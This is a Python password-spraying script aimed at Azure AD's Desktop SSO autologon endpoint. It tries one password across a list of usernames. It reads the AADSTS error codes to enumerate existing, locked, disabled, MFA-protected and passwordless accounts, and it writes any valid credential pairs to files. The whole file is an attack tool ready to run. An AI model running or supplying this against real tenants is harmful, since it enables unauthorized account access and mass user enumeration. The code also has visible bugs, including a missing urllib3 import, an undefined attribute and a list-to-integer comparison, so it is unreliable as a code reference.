import os
import sys
import uuid
import requests
import datetime
import argparse
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed, wait


class Sprayer():
    def __init__(self,domain,debug,threshold,save_all):
        self.domain = domain
        self.debug = debug
        self.threshold = threshold
        self.save_all = save_all
        self.valid_accounts = set()
        self.locked_accounts = set()
        self.deleted_accounts = set()
        self.disabled_accounts = set()
        self.exist_accounts = set()
        self.mfa_accounts = set()
        self.passwordless_accounts = set()
        self.session = requests.Session()
        self.kill = False


    def autologon_auth(self,user,password):
        if self.kill:
            return
        self.session.cookies.clear()
        ruid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        useruid = str(uuid.uuid4())
        url = f'https://autologon.microsoftazuread-sso.com/{self.domain}/winauth/trust/2005/usernamemixed?client-request-id={ruid}'
        created = datetime.datetime.utcnow().isoformat() + 'Z'
        expire_date = datetime.datetime.utcnow() + datetime.timedelta(minutes=10)
        expired = expire_date.isoformat() + "Z"
        headers = {'Content-Type': 'text/xml',
                'User-Agent':'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'}
        data = f'''
<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>
    <s:Header>
        <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
        <wsa:To s:mustUnderstand='1'>{url}</wsa:To>
        <wsa:MessageID>urn:uuid:{muid}</wsa:MessageID>
        <wsse:Security s:mustUnderstand="1">
            <wsu:Timestamp wsu:Id="_0">
                <wsu:Created>{created}</wsu:Created>
                <wsu:Expires>{expired}</wsu:Expires>
            </wsu:Timestamp>
            <wsse:UsernameToken wsu:Id="uuid-{useruid}">
                <wsse:Username>{user}</wsse:Username>
                <wsse:Password>{password}</wsse:Password>
            </wsse:UsernameToken>
        </wsse:Security>
    </s:Header>
    <s:Body>
        <wst:RequestSecurityToken Id='RST0'>
            <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
                <wsp:AppliesTo>
                    <wsa:EndpointReference>
                        <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
                    </wsa:EndpointReference>
                </wsp:AppliesTo>
                <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
        </wst:RequestSecurityToken>
    </s:Body>
</s:Envelope>
        '''
        try:
            r = self.session.post(url,data=data,headers=headers,verify=False,timeout=10)
        except urllib3.exceptions.ReadTimeoutError:
            r = self.session.post(url,data=data,headers=headers,verify=False,timeout=10)
        except Exception as e:
            print(f'[!] Request failed with error {e}')
            r = self.session.post(url,data=data,headers=headers,verify=False,timeout=10)

        response_xml = BeautifulSoup(r.text,'xml')

        if r.status_code != 400:
            if response_xml.find_all('wst:RequestSecurityTokenResponse') > 0:
                self.valid_accounts.add(f'{user}:{password}')
        elif r.status_code == 400:
            if len(response_xml.find_all('S:Fault')) != 1:
                print(f'[!] Weird response found. Multiple fault codes found in response')
            else:
                fault_message = response_xml.find_all('S:Subcode')[0].find_all('S:Value')[0].text
                if fault_message != 'wst:FailedAuthentication':
                    print(f'[!] Found a different fault code:  {fault_message}')
                
                code = response_xml.find_all('psf:text')[0].text.split(':')[0]

                if code == "AADSTS50126":
                    if self.save_all: self.exist_accounts.add(f'{user}')
                elif code == "AADSTS50053": #Locked Account
                    print(f'[!] Account {user} is locked')
                    if self.save_all: 
                        self.locked_accounts.add(f'{user}')
                        self.exist_accounts.add(f'{user}')
                    if self.threshold != 0:
                        if len(self.locked_accounts) >= self.threshold:
                            print('[!] Locked accounts threshold reached!!')
                            print('[!] Shutting down and saving the results')
                            self.kill = True
                elif code == "AADSTS50056":
                    print(f'[!] Account {user} exists without password')
                    if self.save_all: 
                        self.passwordless.add(f'{user}:{password}')
                        self.exist_accounts.add(f'{user}')
                elif code == "AADSTS50014":
                    print(f'[!] Account {user} exists, but max passthru auth time exceeded')
                    if self.save_all: self.exist_accounts.add(f'{user}')
                elif code == "AADSTS50076":
                    print(f'[!] Account {user} must use multi-factor authentication to access {self.domain}')
                    if self.save_all: 
                        self.mfa_accounts.add(f'{user}:{password}')
                        self.exist_accounts.add(f'{user}')
                    self.valid_accounts.add(f'{user}:{password}')
                elif code == "AADSTS700016":
                    print(f'[!] Application not found in the tenant. Perhaps Azure login is not enabled?')
                elif code == "AADSTS50034":
                    print(f'[!] Account {user} does not exist')
                    if self.save_all : self.deleted_accounts.add(f'{user}')
                elif code == "AADSTS50057":
                    print(f'[!] Account {user} is disabled')
                    if self.save_all : self.disabled_accounts.add(f'{user}')
                elif code == "AADSTS90002":
                    print(f'[!] Account {user} does not belong to this tenant')
                    #if the domain of the account is different, should we make a new request using that domain? perhaps the result is that the account exist ?
                elif code == "AADSTS81016":
                    print(f'[!] Undocumented error {code}. Perhaps DesktopSSO is disabled?')
                else:
                    print(f'[!] New code found {code} when testing user {user}:{password}')
                    #https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes


def saveResult(data,out_file):
    with open(out_file,'a') as f:
        for line in data:
            f.write(line+'\n')

def main():
    parser = argparse.ArgumentParser(description='Azure AD SSO Password Spraying Tool')
    parser.add_argument('-u','--users', help='File with users', required=True)
    parser.add_argument('-p','--password', help='Password to test', required=True)
    parser.add_argument('-o','--output', help='Output file. Default is out.txt',default='out.txt')
    parser.add_argument('-a','--save-all', action='store_true', help='Save all the information found in different files (locked accounts in locked.txt, disabled accounts in disabled.txt, non-existing accounts in nonexisting.txt, mfa accounts in mfa.txt, existing accounts in existing.txt)',default=False)
    parser.add_argument('-t','--threads', help='Maximum number of threads to use. Default 32',default=32)
    parser.add_argument('-d','--debug', help='Enable debug mode', action='store_true',default=False)
    parser.add_argument('-s','--threshold', help='Set a safe threshold to stop execution after a number of locked accounts is found. Default is 0', default=0)
    args = parser.parse_args()

    if not os.path.isfile(args.users):
        print("Path to users file is invalid!")
        sys.exit(1)
    #create output folder
    try: 
        os.makedirs('results')
    except OSError:
        if not os.path.isdir('results'):
            print('Unable to create results folder')
            sys.exit(1)

    executor = ThreadPoolExecutor(max_workers=args.threads)
    threads = []

    domain = open(args.users,'r').readline().strip().split('@')[1].lower()
    spr = Sprayer(domain,args.debug,args.threshold,args.save_all)
    print(f'[*] Starting spraying for {domain}')

    with open(args.users,'r') as f:
        for user in f:
            threads.append(executor.submit(spr.autologon_auth,user.strip().lower(),args.password))
    wait(threads)
    for task in as_completed(threads):
        threads.remove(task)
    if len(threads) > 0:
        print('[!] There seems to be errors with some threads')

    saveResult(spr.valid_accounts,os.path.join('results',args.output))

    if spr.save_all:
        saveResult(spr.locked_accounts,os.path.join('results','locked.txt'))
        saveResult(spr.deleted_accounts,os.path.join('results','nonexisting.txt'))
        saveResult(spr.disabled_accounts,os.path.join('results','disabled.txt'))
        saveResult(spr.mfa_accounts,os.path.join('results','mfa.txt'))
        saveResult(spr.passwordless_accounts,os.path.join('results','passwordless.txt'))
        saveResult(spr.exist_accounts,os.path.join('results','existing.txt'))

    print('[*] Done!')

if __name__ == "__main__":
    main()
